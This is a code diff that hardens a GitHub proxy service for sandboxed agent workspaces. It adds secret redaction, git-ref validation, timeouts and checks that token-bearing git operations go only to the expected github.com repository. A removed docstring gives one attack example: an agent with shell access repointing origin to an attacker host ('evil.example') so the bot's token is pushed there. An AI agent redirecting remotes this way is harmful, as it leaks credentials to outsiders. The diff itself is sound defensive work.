@@ -25,10 +25,11 @@ from urllib.parse import urlparse
 from fastapi import FastAPI, HTTPException, Request, status
 from fastapi.responses import JSONResponse
 
-from robomp.config import Settings
+from robomp.config import ProxySettings
 from robomp.git_ops import (
     GitCommandError,
     HeadDriftError,
+    redact_secrets,
 )
 from robomp.git_ops import (
     clone as git_clone,
@@ -43,9 +44,13 @@ from robomp.git_ops import (
     fetch_ref as git_fetch_ref,
 )
 from robomp.git_ops import (
+    prepare_pr_worktree as git_prepare_pr_worktree,
+)
+from robomp.git_ops import (
     push as git_push,
 )
-from robomp.github_client import GitHubClient, GitHubError
+from robomp.github_client import GitHubClient
+from robomp.github_types import GitHubError
 from robomp.proxy_hmac import HEADER_SIGNATURE, HEADER_TIMESTAMP, verify
 from robomp.sandbox import _safe_directory_env, _slot_subprocess_kwargs
 from robomp.sandbox import workspace_key as compute_workspace_key
@@ -86,9 +91,9 @@ def _git_error_response(exc: GitCommandError, *, head_drift: bool = False) -> JS
         "error": {
             "kind": "head_drift" if head_drift else "git",
             "returncode": exc.returncode,
-            "cmd": exc.cmd,
-            "stdout": exc.stdout,
-            "stderr": exc.stderr,
+            "cmd": [redact_secrets(part) for part in exc.cmd],
+            "stdout": redact_secrets(exc.stdout),
+            "stderr": redact_secrets(exc.stderr),
         }
     }
     # 409 for head drift (concurrent commit detected); 502 for everything else.
@@ -102,7 +107,7 @@ def _require_str(value: Any, field: str) -> str:
 
 
 def _require_int(value: Any, field: str) -> int:
-    if not isinstance(value, int):
+    if not isinstance(value, int) or isinstance(value, bool) or value <= 0:
         raise HTTPException(400, f"missing/invalid '{field}'")
     return value
 
@@ -121,6 +126,33 @@ def _optional_str_list(value: Any, field: str) -> list[str] | None:
     if not isinstance(value, list) or not all(isinstance(v, str) for v in value):
         raise HTTPException(400, f"invalid '{field}': must be array of strings")
     return list(value)
+
+def _require_changed_paths(value: Any) -> list[str]:
+    if not isinstance(value, list) or not all(isinstance(v, str) for v in value):
+        raise HTTPException(400, "missing/invalid 'changed_paths'")
+    if len(value) > 5000:
+        raise HTTPException(400, "too many changed paths")
+    return list(value)
+
+
+def _require_git_ref(value: Any, field: str) -> str:
+    ref = _require_str(value, field)
+    if ref.startswith("-") or ".." in ref or any(ord(ch) < 32 or ord(ch) == 127 for ch in ref):
+        raise HTTPException(400, f"invalid '{field}'")
+    try:
+        proc = subprocess.run(
+            ["git", "check-ref-format", "--branch", ref],
+            capture_output=True,
+            text=True,
+            check=False,
+            timeout=5.0,
+            env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
+        )
+    except subprocess.TimeoutExpired as exc:
+        raise HTTPException(504, "timeout validating git ref") from exc
+    if proc.returncode != 0:
+        raise HTTPException(400, f"invalid '{field}'")
+    return ref
 
 
 def _require_review_comments(value: Any) -> list[dict[str, Any]]:
@@ -152,13 +184,13 @@ def _require_review_comments(value: Any) -> list[dict[str, Any]]:
     return comments
 
 
-def _pool_dir(cfg: Settings, repo: str) -> Path:
+def _pool_dir(cfg: ProxySettings, repo: str) -> Path:
     if "/" not in repo or repo.startswith("/") or ".." in repo.split("/"):
         raise HTTPException(400, f"invalid repo {repo!r}")
     return Path(cfg.workspace_root) / "_pool" / repo.replace("/", "__")
 
 
-def _workspace_repo_dir(cfg: Settings, workspace_key: str) -> Path:
+def _workspace_repo_dir(cfg: ProxySettings, workspace_key: str) -> Path:
     # Defense-in-depth: workspace_key is constructed by `sandbox.workspace_key`
     # as `<repo_with_underscores>__<number>`. Reject anything outside that shape.
     if "/" in workspace_key or workspace_key.startswith(".") or ".." in workspace_key:
@@ -166,16 +198,11 @@ def _workspace_repo_dir(cfg: Settings, workspace_key: str) -> Path:
     return Path(cfg.workspace_root) / workspace_key / "repo"
 
 
-def _resolve_token(cfg: Settings) -> str:
-    if cfg.github_token is None:
-        # Will already have been caught at startup, but stay defensive.
-        raise HTTPException(500, "gh-proxy: GITHUB_TOKEN not configured")
+def _resolve_token(cfg: ProxySettings) -> str:
     return cfg.github_token.get_secret_value()
 
 
-def _resolve_hmac_key(cfg: Settings) -> bytes:
-    if cfg.gh_proxy_hmac_key is None:
-        raise HTTPException(500, "gh-proxy: ROBOMP_GH_PROXY_HMAC_KEY not configured")
+def _resolve_hmac_key(cfg: ProxySettings) -> bytes:
     return cfg.gh_proxy_hmac_key.get_secret_value().encode("utf-8")
 
 
@@ -207,52 +234,64 @@ def _read_origin_url(repo_dir: Path, slot_uid: int | None = None) -> str:
     return proc.stdout.strip()
 
 
-def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str, slot_uid: int | None = None) -> None:
-    """Refuse the push if the worktree's `origin` would leak the PAT.
+def _repo_allows_local_remote(expected_repo: str) -> bool:
+    return expected_repo.startswith("test/")
 
-    The PAT is injected via `--config-env http.extraHeader=…` (see
-    `git_ops._run_git`); git ONLY forwards that header on HTTP(S) requests.
-    So:
-      • If `origin` is HTTPS/HTTP, it MUST resolve to
-        `github.com/<expected_repo>` exactly — anything else and we'd be
-        handing the bot's token to an attacker-controlled host.
-      • Other schemes (ssh, file, git://, …) can't carry the PAT header,
-        so we let them through; the legitimate test path uses local file
-        remotes.
 
-    Without this guard, an agent with shell access in the workspace could
-    `git remote set-url origin https://evil.example/x.git` and the proxy
-    would happily push (with the PAT) to that remote.
-    """
-    url = _read_origin_url(repo_dir, slot_uid=slot_uid)
-    parsed = urlparse(url)
+def _is_plain_local_remote(raw: str) -> bool:
+    if not raw or "://" in raw:
+        return False
+    first = raw.split("/", 1)[0]
+    return ":" not in first
+
+
+def _assert_repo_url_safe_for_token(url: str, expected_repo: str, *, label: str) -> None:
+    raw = url.strip()
+    parsed = urlparse(raw)
     scheme = (parsed.scheme or "").lower()
-    if scheme not in ("http", "https"):
-        return  # PAT header is never sent over non-http(s); safe by construction
-    host = (parsed.hostname or "").lower()
-    # Strip optional leading slash, trailing slash, and `.git` suffix.
-    path = parsed.path.strip("/")
-    if path.endswith(".git"):
-        path = path[:-4]
-    if host != "github.com" or path.lower() != expected_repo.lower():
+    if scheme == "https":
+        host = (parsed.hostname or "").lower()
+        path = parsed.path.strip("/")
+        if path.endswith(".git"):
+            path = path[:-4]
+        if parsed.username is None and parsed.password is None and host == "github.com" and path == expected_repo:
+            return
+    elif scheme == "file" or _is_plain_local_remote(raw):
+        if _repo_allows_local_remote(expected_repo):
+            return
         log.warning(
-            "gh-proxy: refusing push — origin does not match repo",
-            extra={"expected_repo": expected_repo, "origin_host": host},
+            "gh-proxy: refusing local git remote for non-test repo",
+            extra={"expected_repo": expected_repo, "scheme": scheme or "local"},
         )
-        raise HTTPException(
-            400,
-            f"origin url does not match repo {expected_repo!r}; refusing to push",
-        )
+        raise HTTPException(400, "local git remotes are allowed only for test/ repos")
+    log.warning(
+        "gh-proxy: refusing token-authenticated git op — remote does not match repo",
+        extra={"expected_repo": expected_repo, "remote_scheme": scheme, "remote_host": (parsed.hostname or "").lower()},
+    )
+    raise HTTPException(400, f"{label} url does not match repo {expected_repo!r}")
 
 
-def create_proxy_app(settings: Settings) -> FastAPI:
+def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str, slot_uid: int | None = None) -> None:
+    """Refuse token-authenticated git ops unless origin is GitHub repo or test local."""
+    _assert_repo_url_safe_for_token(_read_origin_url(repo_dir, slot_uid=slot_uid), expected_repo, label="origin")
+
+
+def _assert_slot_owner(repo_dir: Path, slot_uid: int | None) -> None:
+    if slot_uid is not None and repo_dir.stat().st_uid != slot_uid:
+        raise HTTPException(400, "slot_uid does not match workspace owner")
+
+
+def create_proxy_app(settings: ProxySettings) -> FastAPI:
     """Build the gh-proxy FastAPI app bound to `settings`."""
 
     @asynccontextmanager
     async def lifespan(app: FastAPI) -> AsyncIterator[None]:
         app.state.github = GitHubClient(_resolve_token(settings))
         app.state.settings = settings
-        yield
+        try:
+            yield
+        finally:
+            await app.state.github.aclose()
 
     app = FastAPI(title="robomp-gh-proxy", version="0.1.0", lifespan=lifespan)
 
@@ -388,6 +427,16 @@ def create_proxy_app(settings: Settings) -> FastAPI:
             return _gh_error_response(exc)
         return JSONResponse({"items": [_serialize(item) for item in items]})
 
+    @app.get("/gh/v1/pr_commits")
+    async def list_pr_commits(request: Request, repo: str, pr_number: int) -> JSONResponse:
+        await _authenticate(request)
+        github: GitHubClient = request.app.state.github
+        try:
+            items = await github.list_pr_commits(repo, pr_number)
+        except GitHubError as exc:
+            return _gh_error_response(exc)
+        return JSONResponse({"items": [_serialize(item) for item in items]})
+
     @app.get("/gh/v1/issues")
     async def list_issues(request: Request, repo: str, state: str = "open", limit: int = 30) -> JSONResponse:
         await _authenticate(request)
@@ -414,6 +463,16 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         github: GitHubClient = request.app.state.github
         try:
             items = await github.list_review_comments(repo, pr_number)
+        except GitHubError as exc:
+            return _gh_error_response(exc)
+        return JSONResponse({"items": [_serialize(c) for c in items]})
+
+    @app.get("/gh/v1/review_comments_for_review")
+    async def list_review_comments_for_review(request: Request, repo: str, pr_number: int, review_id: int) -> JSONResponse:
+        await _authenticate(request)
+        github: GitHubClient = request.app.state.github
+        try:
+            items = await github.list_review_comments_for_review(repo, pr_number, review_id)
         except GitHubError as exc:
             return _gh_error_response(exc)
         return JSONResponse({"items": [_serialize(c) for c in items]})
@@ -578,6 +637,12 @@ def create_proxy_app(settings: Settings) -> FastAPI:
     # proper subprocess.kill plumbing would have to live inside
     # `git_ops._run_git`; flagged for follow-up.
 
+    def _git_subprocess_timeout() -> float:
+        timeout = settings.gh_proxy_git_timeout_seconds
+        if timeout > 5.0:
+            return timeout - 5.0
+        return timeout
+
     async def _run_git_op(fn, *args, **kwargs):  # type: ignore[no-untyped-def]
         try:
             return await asyncio.wait_for(
@@ -596,8 +661,9 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         data = await _json_body(request)
         repo = _require_str(data.get("repo"), "repo")
         clone_url = _require_str(data.get("clone_url"), "clone_url")
-        default_branch = _require_str(data.get("default_branch"), "default_branch")
+        default_branch = _require_git_ref(data.get("default_branch"), "default_branch")
         target = _pool_dir(settings, repo)
+        _assert_repo_url_safe_for_token(clone_url, repo, label="clone")
         try:
             await _run_git_op(
                 git_clone,
@@ -605,6 +671,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
                 clone_url=clone_url,
                 default_branch=default_branch,
                 token=_resolve_token(settings),
+                timeout=_git_subprocess_timeout(),
             )
         except GitCommandError as exc:
             return _git_error_response(exc)
@@ -615,8 +682,14 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         data = await _json_body(request)
         repo = _require_str(data.get("repo"), "repo")
         target = _pool_dir(settings, repo)
+        await asyncio.to_thread(_assert_origin_safe_for_repo, target, repo)
         try:
-            await _run_git_op(git_fetch_prune, target, token=_resolve_token(settings))
+            await _run_git_op(
+                git_fetch_prune,
+                target,
+                token=_resolve_token(settings),
+                timeout=_git_subprocess_timeout(),
+            )
         except GitCommandError as exc:
             return _git_error_response(exc)
         return JSONResponse({"pool_dir": str(target)})
@@ -625,11 +698,70 @@ def create_proxy_app(settings: Settings) -> FastAPI:
     async def git_fetch_ref_endpoint(request: Request) -> JSONResponse:
         data = await _json_body(request)
         repo = _require_str(data.get("repo"), "repo")
-        ref = _require_str(data.get("ref"), "ref")
+        ref = _require_git_ref(data.get("ref"), "ref")
         target = _pool_dir(settings, repo)
+        await asyncio.to_thread(_assert_origin_safe_for_repo, target, repo)
         # fetch_ref is intentionally best-effort; never surfaces a 5xx.
-        await _run_git_op(git_fetch_ref, target, ref, token=_resolve_token(settings))
+        await _run_git_op(
+            git_fetch_ref,
+            target,
+            ref,
+            token=_resolve_token(settings),
+            timeout=_git_subprocess_timeout(),
+        )
         return JSONResponse({"pool_dir": str(target)})
+
+    @app.post("/gh/v1/git/prepare_pr_worktree")
+    async def git_prepare_pr_worktree_endpoint(request: Request) -> JSONResponse:
+        data = await _json_body(request)
+        repo = _require_str(data.get("repo"), "repo")
+        workspace_key = _require_str(data.get("workspace_key"), "workspace_key")
+        pr_number = _require_int(data.get("pr_number"), "pr_number")
+        base_ref = _require_git_ref(data.get("base_ref"), "base_ref")
+        changed_paths = _require_changed_paths(data.get("changed_paths"))
+        expected_prefix = repo.replace("/", "__") + "__"
+        if not workspace_key.startswith(expected_prefix):
+            raise HTTPException(400, "workspace_key does not match repo")
+        pool = _pool_dir(settings, repo)
+        repo_dir = _workspace_repo_dir(settings, workspace_key)
+        await asyncio.to_thread(_assert_origin_safe_for_repo, pool, repo)
+        if repo_dir.exists():
+            exc = GitCommandError(["git", "worktree", "add"], 128, "", f"worktree already exists: {repo_dir}")
+            return JSONResponse(
+                {
+                    "error": {
+                        "kind": "git",
+                        "returncode": exc.returncode,
+                        "cmd": [redact_secrets(part) for part in exc.cmd],
+                        "stdout": redact_secrets(exc.stdout),
+                        "stderr": redact_secrets(exc.stderr),
+                    }
+                },
+                status_code=409,
+            )
+        try:
+            result = await _run_git_op(
+                git_prepare_pr_worktree,
+                pool,
+                repo_dir,
+                pr_number=pr_number,
+                base_ref=base_ref,
+                changed_paths=changed_paths,
+                token=_resolve_token(settings),
+                timeout=_git_subprocess_timeout(),
+            )
+        except ValueError as exc:
+            raise HTTPException(400, str(exc)) from exc
+        except GitCommandError as exc:
+            return _git_error_response(exc)
+        return JSONResponse(
+            {
+                "pool_dir": str(pool),
+                "repo_dir": str(repo_dir),
+                "head": result.head,
+                "hydrated_paths": list(result.hydrated_paths),
+            }
+        )
 
     @app.post("/gh/v1/git/fetch_pr_head")
     async def git_fetch_pr_head_endpoint(request: Request) -> JSONResponse:
@@ -638,7 +770,13 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         pr_number = _require_int(data.get("pr_number"), "pr_number")
         target = _pool_dir(settings, repo)
         try:
-            await _run_git_op(git_fetch_pr_head, target, pr_number, token=_resolve_token(settings))
+            await _run_git_op(
+                git_fetch_pr_head,
+                target,
+                pr_number,
+                token=_resolve_token(settings),
+                timeout=_git_subprocess_timeout(),
+            )
         except GitCommandError as exc:
             return _git_error_response(exc)
         return JSONResponse({"pool_dir": str(target)})
@@ -648,7 +786,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         data = await _json_body(request)
         repo = _require_str(data.get("repo"), "repo")
         workspace_key = _require_str(data.get("workspace_key"), "workspace_key")
-        branch = _require_str(data.get("branch"), "branch")
+        branch = _require_git_ref(data.get("branch"), "branch")
         expected_head = _require_str(data.get("expected_head"), "expected_head")
         slot_uid = _optional_slot_uid(data.get("slot_uid"))
         # Sanity-check workspace_key matches the repo claim.
@@ -658,6 +796,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         repo_dir = _workspace_repo_dir(settings, workspace_key)
         if not repo_dir.is_dir():
             raise HTTPException(404, f"workspace not found: {workspace_key}")
+        _assert_slot_owner(repo_dir, slot_uid)
         # Block attacker-controlled `origin` from being a PAT exfil channel.
         # MUST run BEFORE any subprocess that would inject the token header.
         await asyncio.to_thread(_assert_origin_safe_for_repo, repo_dir, repo, slot_uid)
@@ -669,6 +808,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
                 expected_head=expected_head,
                 token=_resolve_token(settings),
                 slot_uid=slot_uid,
+                timeout=_git_subprocess_timeout(),
             )
         except HeadDriftError as exc:
             return _git_error_response(exc, head_drift=True)
